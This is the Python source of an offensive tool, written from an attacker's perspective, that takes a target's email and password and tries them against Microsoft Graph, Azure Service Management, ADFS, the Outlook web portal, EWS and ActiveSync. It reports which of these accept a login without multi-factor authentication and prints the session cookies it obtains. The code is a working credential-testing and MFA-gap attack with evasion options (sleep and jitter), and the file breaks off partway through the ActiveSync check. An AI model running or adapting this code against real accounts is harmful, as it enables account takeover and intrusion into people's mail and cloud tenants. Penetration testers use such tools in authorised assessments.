#!/usr/bin/env python3
import argparse
import sys
import os
import requests
import tempfile

import xml.etree.ElementTree as ET
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import time
import re
import json
from exchangelib import Account, Credentials
import base64
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

__authors__ = ["kreep", "phyu"]
__version__ = 1.01

f"""
Authors: {__authors__}
Twitter: @kreepsec, @nihsuyhp
License: MIT
"""

tmp_file = "/tmp/request.html"  ## default temp

# helper class for colour printing
class PP:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    def __init__(self):
        self.init = True

    def warning(self, words):
        print(f'[{self.WARNING}+{self.ENDC}] {words}')

    def success(self, words):
        print(f'[{self.OKGREEN}*{self.ENDC}] {words}')

    def error(self, words):
        print(f'[{self.FAIL}-{self.ENDC}] {words}')

    def info(self, words):
        print(f'[{self.OKCYAN}i{self.ENDC}] {words}')

    def debug(self, words):
        print(f" - [{self.OKCYAN}dbg{self.ENDC}] - {words}\n\n")
    
    def green(self, words):
        return f'{self.OKGREEN}{words}{self.ENDC}'

    def red(self, words):
        return f"{self.WARNING}{words}{self.ENDC}"

pp = PP()
exclude_mappings = """
'gapi' : "Microsoft Graph API",
'asm' : "Azure Service Management",
'ews' : "Microsoft 365 Exchange Web Services (EWS)",
'as' : "Active Sync",
'mwp-W' : "Microsoft Web Portal - Windows PC User Agent",
'mwp-L' : "Microsoft Web Portal - Linux PC User Agent",
'mwp-M' : "Microsoft Web Portal - MacOS PC User Agent",
'mwp-A' : "Microsoft Web Portal - Android User Agent",
'mwp-I' : "Microsoft Web Portal - iPhone User Agent",
'mwp-wp' : "Microsoft Web Portal - Windows Phone User Agent"
"""

parser = argparse.ArgumentParser(
    description='A tool to find failure points in Microsoft Multi Factor Authentication configurations from an attacker\'s perspective but with some extra OPSEC features.',
    epilog="This program is made for use in authorised environments. Please do not use it for evil."
)
parser.add_argument('--username', '-u', help='target email address (e.g e.alderson@evilcorp.com)')
parser.add_argument('--password', '-p', help='target\'s password')
parser.add_argument('--recon', '-r', action="store_true", help='script will attempt to locate ADFS configurations')
parser.add_argument('--adfs', action="store_true", help='script will attempt to login to ADFS in addition to the other Microsoft protocols')
parser.add_argument('--sleep', '-s', type=int, help='OPSEC: how long to sleep between authentication attempts (in seconds)')
parser.add_argument('--jitter', '-j', type=int, help='OPSEC: percentage change added to sleep value for further sleep randomisation (0-100)')
parser.add_argument('--ioc', action="store_true", help='OPSEC: Print a report with the generated HTTP request times and their corresponding target URLs')
parser.add_argument('--exclude','-e', help="OPSEC: Exclude given checks. Provide the checks to exclude as a comma-separated list. Possible values are: gapi,asm,ews,as,mwp-W,mwp-L,mwp-M,mwp-A,mwp-I,mwp-wp. Check the source code for mappings")
parser.add_argument('--debug', action="store_true", help='Add Debugging info (prints out responses to allow you to see the actual message)')

args = parser.parse_args()
if len(sys.argv) < 2:
    parser.print_usage()
    sys.exit(1)

# Class to hold IOCs - just http authentication requests for now.
class Iocs:
    def __init__(self):
        self.auth_requests = []

    def add_to_list(self, item):
        self.auth_requests.append(item)

iocs_instance = Iocs()

def check_text_in_elements(text, tags):
    for t in tags:
        if text.lower() in t:
            return True
    return False

# ====== Functionality starts here ======

def showChecks(excluded):
    excluded_checks = excluded.split(',')
    checks_enum = {
        'gapi' : "Microsoft Graph API",
        'asm' : "Azure Service Management",
        'ews' : "Microsoft 365 Exchange Web Services (EWS)",
        'as': "Active Sync",
        'mwp-w' : "Microsoft Web Portal - Windows PC User Agent",
        'mwp-L' : "Microsoft Web Portal - Linux PC User Agent",
        'mwp-M' : "Microsoft Web Portal - MacOS PC User Agent",
        'mwp-A' : "Microsoft Web Portal - Android User Agent",
        'mwp-I' : "Microsoft Web Portal - iPhone User Agent",
        'mwp-wp' : "Microsoft Web Portal - Windows Phone User Agent"
    }
    pp.info("The following checks will be performed:")
    for c in checks_enum:
        if c not in excluded_checks:
            print(checks_enum[c])
    print('\n')

def reconADFS(username):
    adfs_check = requests.get("https://login.microsoftonline.com/getuserrealm.srf", params={"login": username, "xml": "1"})
    if args.ioc:
        req = (adfs_check.url, adfs_check.headers.get('date'))
        iocs_instance.add_to_list(req)
    adfsxml = ET.fromstring(adfs_check.content)
    try:
        root_adfs_url = urlparse(adfsxml.find('AuthURL').text)
        adfs_domain = root_adfs_url.netloc
        namespace_type = adfsxml.find('NameSpaceType').text
        if namespace_type == "Federated":
            return root_adfs_url, adfs_domain
        elif namespace_type == "Managed":
            pp.warning("ADFS does not appear to be in use. Authentication appears to be managed by Microsoft.")
            return root_adfs_url, adfs_domain
        elif namespace_type == "Unknown":
            pp.warning("The target email is not linked to Microsoft Online or O365. Authentication will most likely fail.")
            return root_adfs_url, adfs_domain
        return False, False
    except:
        return False, False

def authADFS(username, password):
    pp.info("Logging into ADFS")
    root_adfs_url, adfs_domain = reconADFS(username)
    try:
        adfs_session = requests.Session()
        adfs_session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'})
        response = adfs_session.get(root_adfs_url.geturl())
        soup = BeautifulSoup(response.text, 'html.parser')
        userform = soup.find('form')
        userform.find('input', {'name': 'UserName'})['value'] = username
        userform.find('input', {'name': 'Password'})['value'] = password
        userform.find('input', {'name': 'AuthMethod'})['value'] = "FormsAuthentication"
        adfsauthpath = userform['action']
        full_adfs_url = f"https://{adfs_domain}{adfsauthpath}"
        adfs_auth_attempt = adfs_session.post(full_adfs_url, data=userform.fields)
        if "MSISAUTH" in [cookie.name for cookie in adfs_session.cookies]:
            pp.success("Success! We can authenticate to ADFS.")
            pp.warning("NOTE: This part may open a browser. If closed immediately it may prevent an SMS/call to the user.")
            for i in range(5, 0, -1):
                pp.warning("Sending Auth Request in {i}...\r", end="")
                time.sleep(1)
            adfs_srf_auth = adfs_session.post("https://login.microsoftonline.com/login.srf", data=adfs_auth_attempt.forms[0].fields, allow_redirects=False)
            if "Stay signed in" in adfs_srf_auth.text:
                pp.success("There is no MFA for this account.")
                pp.success(f"Login with a web browser to {full_adfs_url}")
                for cookie in adfs_session.cookies:
                    pp.info(f"{cookie.name} = {cookie.value}")
            elif adfs_srf_auth.status_code == 302:
                if "device.login.microsoftonline.com" in adfs_srf_auth.headers["Location"]:
                    pp.warning("Redirected after login. MFA is in place to SMS or Call the user.")
                elif "Verify your identity" in adfs_srf_auth.text:
                    pp.warning("MFA is configured.")
            if args.ioc:
                for h in adfs_session:
                    print(h.url)
                    print(h.headers.get('date'))
                    req = (h.url, h.headers.get('date'))
                    iocs_instance.add_to_list(req)
            return True
        else:
            pp.error("Login failed.")
            return False
    except Exception as e:
        pp.error("ADFS authentication failed in an unexpected way. Aborting ADFS check.")
        return False

def authGAPI(username, password):
    url = "https://login.microsoft.com"
    pp.info("=== Logging into Microsoft Graph API ===")
    body_params = {
        'resource': 'https://graph.windows.net',
        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
        'client_info': '1',
        'grant_type': 'password',
        'username': username,
        'password': password,
        'scope': 'openid'
    }
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    final_url = f"{url}/common/oauth2/token" 
    response = requests.post(final_url, data=body_params, headers=headers)
    if args.debug:
        pp.debug(f"[authGAPI] - {response.text}")
    if args.ioc:
        req = (response.url, response.headers.get('date'))
        iocs_instance.add_to_list(req)
    if response.status_code == 200:
        pp.success(f"Success! {username} is able to authenticate to the Microsoft Graph API")
        pp.success("The MSOnline PowerShell module can be used to leverage this.")
        return True
    else:
        if "AADSTS50126" in response.text:
            pp.error(" Login appears to have failed.")
        elif "AADSTS50128" in response.text or "AADSTS50059" in response.text:
            pp.error(f"  Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
        elif "AADSTS50034" in response.text:
            pp.error(f"  The user {username} doesn't exist.")
        elif "AADSTS50079" in response.text or "AADSTS50076" in response.text:
            pp.error(f" SUCCESS! {username} was able to authenticate to the Microsoft Graph API - NOTE: The response indicates MFA (Microsoft) is in use.")
        elif "AADSTS50158" in response.text:
            pp.error(f" SUCCESS! {username} was able to authenticate to the Microsoft Graph API - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
        elif "AADSTS50053" in response.text:
            pp.error(f"  The account {username} appears to be locked.")
        elif "AADSTS50057" in response.text:
            pp.error(f"  The account {username} appears to be disabled.")
        elif "AADSTS50055" in response.text:
            pp.error(f" SUCCESS! {username} was able to authenticate to the Microsoft Graph API - NOTE: The user's password is expired.")
        else:
            pp.error(f" We received an unknown error for the user: {username}")
        if args.debug:
            pp.debug(f"[authGAPI:response] - {response.text}")
        return False

def authASM(username, password):
    url = "https://login.microsoftonline.com"
    pp.info("=== Logging into Microsoft Service Management API ===")
    body_params = {
        'resource': 'https://management.core.windows.net',
        'client_id': '1950a258-227b-4e31-a9cf-717495945fc2',
        'grant_type': 'password',
        'username': username,
        'password': password,
        'scope': 'openid'
    }
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    final_url = f"{url}/Common/oauth2/token" 
    response = requests.post(final_url, data=body_params, headers=headers)
    if args.debug:
        pp.debug(f"[AuthASM]: {response.text}")
    if args.ioc:
        req = (response.url, response.headers.get('date'))
        iocs_instance.add_to_list(req)
        if args.debug:
            pp.debug(f"[AuthASM - and IOC]:")
    if response.status_code == 200:
        pp.success(f"Success! {username} is able to authenticate to the Microsoft Service Management API")
        pp.success("The Az PowerShell module can be used to leverage this.")
        return True
    else:
        if "AADSTS50126" in response.text:
            pp.error(" Login appears to have failed.")
        elif "AADSTS50128" in response.text or "AADSTS50059" in response.text:
            pp.error(f"  Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
        elif "AADSTS50034" in response.text:
            pp.error(f"  The user {username} doesn't exist.")
        elif "AADSTS50079" in response.text or "AADSTS50076" in response.text:
            pp.error(f" SUCCESS! {username} was able to authenticate to the Microsoft Graph API - NOTE: The response indicates MFA (Microsoft) is in use.")
        elif "AADSTS50158" in response.text:
            pp.error(f" SUCCESS! {username} was able to authenticate to the Microsoft Graph API - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
        elif "AADSTS50053" in response.text:
            pp.error(f"  The account {username} appears to be locked.")
        elif "AADSTS50057" in response.text:
            pp.error(f"  The account {username} appears to be disabled.")
        elif "AADSTS50055" in response.text:
            pp.error(f" SUCCESS! {username} was able to authenticate to the Microsoft Graph API - NOTE: The user's password is expired.")
        else:
            pp.error(f" We received an unknown error for the user: {username}")
        if args.debug:
            pp.debug(f"[AuthASM:error]: {response.text}")
        return False

def authWP_direct(device, username, password, user_agent, session, headers):
    """Direct authentication approach for the new Microsoft login flow"""
    if args.debug:
        pp.debug(f"[AuthWP_direct] - Using direct authentication approach")
    
    try:
        # Try to authenticate directly to Microsoft login endpoint
        login_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
        
        # Prepare authentication data for OAuth 2.0
        auth_data = {
            "grant_type": "password",
            "client_id": "00000002-0000-0ff1-ce00-000000000000",  # Office 365 client ID
            "username": username,
            "password": password,
            "scope": "https://outlook.office365.com/.default openid profile email"
        }
        
        response = session.post(login_url, data=auth_data, headers=headers)
        if args.debug:
            pp.debug(f"[AuthWP_direct - Token Response]: {response.text}")
        if args.ioc:
            req = (response.url, response.headers.get('date'))
            iocs_instance.add_to_list(req)
        
        if response.status_code == 200:
            try:
                token_data = response.json()
                if "access_token" in token_data:
                    # Use the access token to access Outlook
                    outlook_headers = headers.copy()
                    outlook_headers["Authorization"] = f"Bearer {token_data['access_token']}"
                    
                    outlook_response = session.get("https://outlook.office365.com/", headers=outlook_headers)
                    if args.debug:
                        pp.debug(f"[AuthWP_direct - Outlook Response]: Status {outlook_response.status_code}")
                    
                    if outlook_response.status_code == 200:
                        pp.success(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal via direct token flow.")
                        return True
            except json.JSONDecodeError:
                if args.debug:
                    pp.debug(f"[AuthWP_direct] - Failed to decode JSON response")
        
        # If direct token approach fails, try browser-based approach
        return authWP_browser_fallback(device, username, password, user_agent, session, headers)
        
    except Exception as e:
        if args.debug:
            pp.debug(f"[AuthWP_direct] - Exception: {str(e)}")
        # Try simple modern flow as last resort
        return authWP_modern_flow(device, username, password, user_agent, session, headers)

def authWP_modern_flow(device, username, password, user_agent, session, headers):
    """Modern Microsoft login flow using the actual current authentication endpoints"""
    if args.debug:
        pp.debug(f"[AuthWP_modern_flow] - Using modern authentication flow")
    
    try:
        # Step 1: First, try to get credential type 
        cred_url = "https://login.microsoftonline.com/common/GetCredentialType"
        cred_data = {
            "username": username,
            "isOtherIdpSupported": "true",
            "checkPhones": "false",
            "isRemoteNGCSupported": "true",
            "isCookieBannerShown": "false",
            "isFidoSupported": "true",
            "country": "US",
            "forceotclogin": "false",
            "isExternalFederationDisallowed": "false",
            "isRemoteConnectSupported": "false",
            "federationFlags": "0",
            "isSignup": "false",
            "isAccessPassSupported": "true"
        }
        
        cred_response = session.post(cred_url, json=cred_data, headers=headers)
        if args.debug:
            pp.debug(f"[AuthWP_modern_flow - Cred]: Status {cred_response.status_code}")
            pp.debug(f"[AuthWP_modern_flow - Cred]: Response {cred_response.text}")
        
        if args.ioc:
            req = (cred_response.url, cred_response.headers.get('date'))
            iocs_instance.add_to_list(req)
        
        # Check if we can proceed
        if cred_response.status_code == 200:
            try:
                cred_json = cred_response.json()
                if cred_json.get("IfExistsResult", 0) == 0:
                    # User exists, try to authenticate
                    flow_token = cred_json.get("FlowToken", "") or cred_json.get("apiCanary", "")
                    
                    if flow_token:
                        # Step 2: Try to authenticate with the flow token using proper parameters
                        auth_url = "https://login.microsoftonline.com/common/login"
                        auth_data = {
                            "login": username,
                            "loginfmt": username,
                            "passwd": password,
                            "LoginOptions": "3",
                            "type": "11",
                            "flowToken": flow_token,
                            "canary": flow_token,  # Use the same token for canary
                            "ps": "2",
                            "psRNGCDefaultType": "",
                            "psRNGCEntropy": "",
                            "psRNGCSLK": "",
                            "i13": "0",
                            "NewUser": "1",
                            "FoundMSAs": "",
                            "fspost": "0",
                            "i21": "0",
                            "CookieDisclosure": "0",
                            "IsFidoSupported": "1",
                            "isSignupPost": "0",
                            "i2": "1",
                            "i17": "",
                            "i18": "",
                            "i19": "198733"
                        }
                        
                        auth_response = session.post(auth_url, data=auth_data, headers=headers, allow_redirects=True)
                        if args.debug:
                            pp.debug(f"[AuthWP_modern_flow - Auth]: Status {auth_response.status_code}")
                            pp.debug(f"[AuthWP_modern_flow - Auth]: URL {auth_response.url}")
                            pp.debug(f"[AuthWP_modern_flow - Auth]: Cookies {[c.name for c in session.cookies]}")
                        
                        if args.ioc:
                            req = (auth_response.url, auth_response.headers.get('date'))
                            iocs_instance.add_to_list(req)
                        
                        # Check for success
                        auth_cookies = ["ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT"]
                        has_auth_cookie = any(cookie.name in auth_cookies for cookie in session.cookies)
                        
                        if has_auth_cookie:
                            pp.success(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now...")
                            
                            # Check for MFA indicators
                            response_lower = auth_response.text.lower()
                            if "stay signed in" in response_lower or "keep me signed in" in response_lower:
                                pp.success("It appears there is no MFA for this account.")
                                pp.success(f"Login with a {device}-based web browser to https://outlook.office365.com. Ex: {user_agent}")
                                return True
                            elif "verify your identity" in response_lower or "approve sign in request" in response_lower:
                                pp.error("MFA for Microsoft 365 via the web portal is enabled.")
                                return False
                            else:
                                pp.success("Authentication successful, but MFA status unclear.")
                                return True
                        else:
                            # Check for MFA requirements without successful cookie
                            response_lower = auth_response.text.lower()
                            if "aadsts50079" in response_lower or "aadsts50076" in response_lower:
                                pp.error(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal - NOTE: MFA is enabled.")
                                return False
                            elif "verify your identity" in response_lower:
                                pp.error(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal - NOTE: MFA is enabled.")
                                return False
                            else:
                                # Check for specific error messages
                                response_lower = auth_response.text.lower()
                                if "aadsts50126" in response_lower:
                                    pp.error("Invalid username or password.")
                                    return False
                                elif "aadsts900043" in response_lower or "context cannot be parsed" in response_lower:
                                    pp.error("Authentication context error. The Microsoft login flow may have changed.")
                                    return False
                                else:
                                    if args.debug:
                                        pp.debug(f"[AuthWP_modern_flow] - Auth response: {auth_response.text[:1000]}...")
                                    pp.error("Login failed to Microsoft 365 Web Portal.")
                                    return False
                    else:
                        pp.error("No flow token received from Microsoft login service.")
                        return False
                else:
                    pp.error(f"User {username} does not exist or cannot be authenticated.")
                    return False
                    
            except json.JSONDecodeError:
                if args.debug:
                    pp.debug(f"[AuthWP_modern_flow] - Failed to decode credential response")
                pp.error("Failed to process Microsoft login response.")
                return False
        else:
            pp.error("Failed to get credential type from Microsoft login service.")
            return False
            
    except Exception as e:
        if args.debug:
            pp.debug(f"[AuthWP_modern_flow] - Exception: {str(e)}")
        pp.error("Login failed to Microsoft 365 Web Portal.")
        return False

def authWP_browser_fallback(device, username, password, user_agent, session, headers):
    """Browser-based authentication fallback"""
    if args.debug:
        pp.debug(f"[AuthWP_browser_fallback] - Using browser-based fallback")
    
    try:
        # Step 1: Get the login form first
        login_form_url = "https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&response_type=code&redirect_uri=https%3A%2F%2Foutlook.office365.com%2Fowa%2F&response_mode=query&scope=openid"
        
        form_response = session.get(login_form_url, headers=headers)
        if args.debug:
            pp.debug(f"[AuthWP_browser_fallback - Form]: Status {form_response.status_code}")
            pp.debug(f"[AuthWP_browser_fallback - Form]: URL {form_response.url}")
            pp.debug(f"[AuthWP_browser_fallback - Form]: Response snippet: {form_response.text[:1000]}...")
        
        if args.ioc:
            req = (form_response.url, form_response.headers.get('date'))
            iocs_instance.add_to_list(req)
        
        # Step 2: Try to extract any required tokens from the form
        ctx = ""
        flow_token = ""
        
        # Look for flowToken or sFT in the form
        flow_patterns = [
            re.compile(r'"flowToken":"([^"]*)"'),
            re.compile(r'"sFT":"([^"]*)"'),
            re.compile(r'value="([^"]*)"[^>]*name="flowToken"'),
            re.compile(r'name="flowToken"[^>]*value="([^"]*)"')
        ]
        
        for pattern in flow_patterns:
            matches = pattern.findall(form_response.text)
            if matches:
                flow_token = matches[0]
                if args.debug:
                    pp.debug(f"[AuthWP_browser_fallback] - Found flow token: {flow_token[:50]}...")
                break
        
        # Look for ctx token and other required parameters
        ctx_patterns = [
            re.compile(r'"ctx":"([^"]*)"'),
            re.compile(r'value="([^"]*)"[^>]*name="ctx"'),
            re.compile(r'name="ctx"[^>]*value="([^"]*)"'),
            re.compile(r'"originalRequest":"([^"]*)"'),
            re.compile(r'"correlationId":"([^"]*)"'),
            re.compile(r'"sessionId":"([^"]*)"')
        ]
        
        for pattern in ctx_patterns:
            matches = pattern.findall(form_response.text)
            if matches:
                ctx = matches[0]
                if args.debug:
                    pp.debug(f"[AuthWP_browser_fallback] - Found ctx: {ctx[:50]}...")
                break
        
        # Also look for other important form fields that might be required
        canary = ""
        canary_patterns = [
            re.compile(r'"canary":"([^"]*)"'),
            re.compile(r'value="([^"]*)"[^>]*name="canary"'),
            re.compile(r'name="canary"[^>]*value="([^"]*)"')
        ]
        
        for pattern in canary_patterns:
            matches = pattern.findall(form_response.text)
            if matches:
                canary = matches[0]
                if args.debug:
                    pp.debug(f"[AuthWP_browser_fallback] - Found canary: {canary[:50]}...")
                break
        
        # Step 3: Submit login with extracted tokens
        login_url = "https://login.microsoftonline.com/common/login"
        
        form_data = {
            "login": username,
            "loginfmt": username,
            "passwd": password,
            "LoginOptions": "3",
            "type": "11",
            "ctx": ctx,
            "flowToken": flow_token,
            "canary": canary,
            "i13": "0",
            "ps": "2",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "i2": "1"
        }
        
        # Remove empty values but keep required fields even if empty
        required_fields = ["login", "loginfmt", "passwd", "flowToken", "LoginOptions", "type"]
        form_data = {k: v for k, v in form_data.items() if v or k in required_fields}
        
        response = session.post(login_url, data=form_data, headers=headers, allow_redirects=True)
        if args.debug:
            pp.debug(f"[AuthWP_browser_fallback - Login]: Response status {response.status_code}")
            pp.debug(f"[AuthWP_browser_fallback - Login]: Response URL {response.url}")
            pp.debug(f"[AuthWP_browser_fallback - Login]: Cookies: {[c.name for c in session.cookies]}")
        
        if args.ioc:
            req = (response.url, response.headers.get('date'))
            iocs_instance.add_to_list(req)
        
        # Check for authentication success indicators
        auth_cookies = ["ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT"]
        has_auth_cookie = any(cookie.name in auth_cookies for cookie in session.cookies)
        
        if has_auth_cookie:
            pp.success(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now...")
            
            # Check for MFA indicators in response
            response_lower = response.text.lower()
            if "stay signed in" in response_lower or "keep me signed in" in response_lower:
                pp.success("It appears there is no MFA for this account.")
                pp.success(f"Login with a {device}-based web browser to https://outlook.office365.com. Ex: {user_agent}")
                return True
            elif "verify your identity" in response_lower or "approve sign in request" in response_lower or "multi-factor" in response_lower:
                pp.error("MFA for Microsoft 365 via the web portal is enabled.")
                return False
            else:
                # Successful login but unsure about MFA status
                pp.success("Authentication successful, but MFA status unclear.")
                return True
        else:
            # Check response for authentication errors or MFA requirements
            response_lower = response.text.lower()
            
            # Check for common authentication error codes in response
            if "aadsts50126" in response_lower:
                pp.error("Invalid username or password.")
                return False
            elif "aadsts50079" in response_lower or "aadsts50076" in response_lower:
                pp.error(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal - NOTE: MFA is enabled.")
                return False
            elif "verify your identity" in response_lower or "multi-factor" in response_lower:
                pp.error(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal - NOTE: MFA is enabled.")
                return False
            else:
                # Check if this is a context parsing error and try modern flow
                response_lower = response.text.lower()
                if "aadsts900043" in response_lower or "bad request" in response_lower or "context cannot be parsed" in response_lower:
                    if args.debug:
                        pp.debug(f"[AuthWP_browser_fallback] - Context parsing error, trying modern flow")
                    return authWP_modern_flow(device, username, password, user_agent, session, headers)
                else:
                    if args.debug:
                        pp.debug(f"[AuthWP_browser_fallback] - Response text: {response.text[:2000]}...")
                    pp.error("Login failed to Microsoft 365 Web Portal.")
                    return False
    
    except Exception as e:
        if args.debug:
            pp.debug(f"[AuthWP_browser_fallback] - Exception: {str(e)}")
        # Try modern flow as last resort
        return authWP_modern_flow(device, username, password, user_agent, session, headers)

def authWP(device, username, password, user_agent):
    pp.info(f"=== Logging into Microsoft Web Portal with {device} User Agent ===")
    o365 = requests.Session()
    headers = {"User-Agent": user_agent}
    
    # Step 1: Get redirected to Microsoft login page
    response = o365.get('https://outlook.office365.com', headers=headers, allow_redirects=False)
    if args.debug:
        pp.debug(f"[AuthWP - Initial Response]: Status: {response.status_code}, Headers: {response.headers}")
    if args.ioc:
        req = (response.url, response.headers.get('date'))
        iocs_instance.add_to_list(req)
    
    # Check if we got redirected to login
    if response.status_code in [302, 301] and 'location' in response.headers:
        login_url = response.headers['location']
        if args.debug:
            pp.debug(f"[AuthWP - Redirect]: {login_url}")
    else:
        # Try to get login URL directly
        login_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&response_type=code&redirect_uri=https%3A%2F%2Foutlook.office365.com%2Fowa%2F&response_mode=query&scope=https%3A%2F%2Foutlook.office365.com%2F.default&state=loginrequest'
        if args.debug:
            pp.debug(f"[AuthWP - Using direct login URL]: {login_url}")
    
    # Step 2: Get the login page
    response = o365.get(login_url, headers=headers)
    if args.debug:
        pp.debug(f"[AuthWP - Login Page]: {response.text[:2000]}...")
    if args.ioc:
        req = (response.url, response.headers.get('date'))
        iocs_instance.add_to_list(req)
    
    # Extract required tokens from the new login flow
    try:
        # Look for flowToken in script tags or data attributes
        flow_token_patterns = [
            re.compile(r'"flowToken":"([^"]*)"'),
            re.compile(r'flowToken["\s]*:["\s]*"([^"]*)"'),
            re.compile(r'data-flow-token="([^"]*)"'),
            re.compile(r'"sFT":"([^"]*)"'),
            re.compile(r'sFT["\s]*:["\s]*"([^"]*)"')
        ]
        
        flow_token = None
        for pattern in flow_token_patterns:
            matches = pattern.findall(response.text)
            if matches:
                flow_token = matches[0]
                if args.debug:
                    pp.debug(f"[AuthWP - Found flowToken]: {flow_token[:50]}...")
                break
        
        # Look for ctx/correlationId
        ctx_patterns = [
            re.compile(r'"ctx":"([^"]*)"'),
            re.compile(r'ctx["\s]*:["\s]*"([^"]*)"'),
            re.compile(r'"correlationId":"([^"]*)"'),
            re.compile(r'correlationId["\s]*:["\s]*"([^"]*)"'),
            re.compile(r'data-ctx="([^"]*)"')
        ]
        
        ctx = None
        for pattern in ctx_patterns:
            matches = pattern.findall(response.text)
            if matches:
                ctx = matches[0]
                if args.debug:
                    pp.debug(f"[AuthWP - Found ctx]: {ctx[:50]}...")
                break
        
        # If we can't find tokens, try a different approach using the current Microsoft login API
        if not flow_token:
            if args.debug:
                pp.debug(f"[AuthWP - No tokens found, trying direct auth approach]")
            return authWP_direct(device, username, password, user_agent, o365, headers)
        
        # Continue with traditional flow if we found tokens
        userform = {
            "username": username,
            "isOtherIdpSupported": "false",
            "checkPhones": "false",
            "isRemoteNGCSupported": "true",
            "isCookieBannerShown": "false",
            "isFidoSupported": "true",
            "originalRequest": ctx or "",
            "country": "US", 
            "forceotclogin": "false",
            "isExternalFederationDisallowed": "false",
            "isRemoteConnectSupported": "false",
            "federationFlags": "0",
            "isSignup": "false",
            "flowToken": flow_token,
            "isAccessPassSupported": "true"
        }
        json_form = json.dumps(userform)
        url = "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"
        response = o365.post(url, headers=headers, json=json_form)
        
    except Exception as e:
        pp.error(f"Error extracting authentication tokens: {str(e)}")
        if args.debug:
            pp.debug(f"Exception details: {e}")
        return False
    if args.debug:
        pp.debug(f"[AuthWP - response]: {response.text}")
    if args.ioc:
        req = (response.url, response.headers.get('date'))
        iocs_instance.add_to_list(req)
    auth_body = {
        "i13": "0",
        "login": username,
        "loginfmt": username,
        "type": "11",
        "LoginOptions": "3",
        "lrt": "",
        "lrtPartition": "",
        "hisRegion": "",
        "hisScaleUnit": "",
        "passwd": password,
        "ps": "2",
        "psRNGCDefaultType": "",
        "psRNGCEntropy": "",
        "psRNGCSLK": "",
        "canary": "",
        "ctx": ctx or "",
        "hpgrequestid": "",
        "flowToken": flow_token or "",
        "NewUser": "1",
        "FoundMSAs": "",
        "fspost": "0",
        "i21": "0",
        "CookieDisclosure": "0",
        "IsFidoSupported": "1",
        "isSignupPost": "0",
        "i2": "1",
        "i17": "",
        "i18": "",
        "i19": "198733",
    }
    response = o365.post("https://login.microsoftonline.com/common/login", headers=headers, data=auth_body)
    if args.debug:
        pp.debug(f"[AuthWP - response]: {response.text}")
        pp.debug(f"session: {o365.cookies}")
        cookies = "cookies:\n"
        for c in o365.cookies:
            cookies = f"{c.name} {c.value}\n"
        pp.debug(f"[AuthWP]:{cookies}")
    if args.ioc:
        req = (response.url, response.headers.get('date'))
        iocs_instance.add_to_list(req)
    if "ESTSAUTH" in [cookie.name for cookie in o365.cookies]:
        pp.success(f"SUCCESS! {username} was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now...")
        if args.debug:
            pp.debug(f"checking for 2fa \n\n\n{response.text}")
        # Start Selenium check for MFA details
        _options = Options()
        _options.add_argument('--headless')
        driver = webdriver.Firefox(options=_options)
        tags = []
        with tempfile.NamedTemporaryFile() as fp:
            if args.debug:
                pp.debug(f"file created {fp.name}")
            with open(fp.name, "w") as f:
                f.write(response.text)
            if args.debug:
                with open("/tmp/response.html", "w") as f:
                    f.write(response.text)
            driver.get(f"file://{fp.name}")
            divs = driver.find_elements(By.TAG_NAME, "div")
        for t in divs:
            if args.debug:
                pp.debug(f"div:{t.text.lower()}")
            tags.append(t.text.lower())
        # Updated checks: look for both "stay signed in" and "keep me signed in"
        if check_text_in_elements("stay signed in", tags) or check_text_in_elements("keep me signed in", tags):
            pp.success("It appears there is no MFA for this account.")
            pp.success(f"Login with a {device}-based web browser to https://outlook.office365.com. Ex: {user_agent}")
            return True
        # Check for MFA prompt using both "verify your identity" and "approve sign in request"
        if check_text_in_elements("verify your identity", tags) or check_text_in_elements("approve sign in request", tags):
            pp.error("MFA for Microsoft 365 via the web portal is enabled.")
            driver.quit()
            return False
    pp.error("Login failed.")
    return False

def authEWS(username, password):
    print("=== Logging into Exchange Web Services ===")
    credentials = Credentials(username=username, password=password)
    try:
        account = Account(primary_smtp_address=username, credentials=credentials, autodiscover=True)
        last_email = account.inbox.all().order_by('-datetime_received')[0]
        pp.success(f"SUCCESS! {username} was able to authenticate to Microsoft 365 EWS!")
        pp.success("MailSniper can be used to leverage this. https://github.com/dafthack/MailSniper")
        return True
    except:
        pp.error("Login failed to Exchange Web Services")
        return False

def authAS(username, password):
    print("=== Logging into Microsoft Active Sync ===")
    easurl = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
    encodeUsernamePassword = base64.b64encode(f"{username}:{password}".encode("utf-8")).decode("utf-8")
    Headers = {"Authorization": f"Basic {encodeUsernamePassword}"}
    try:
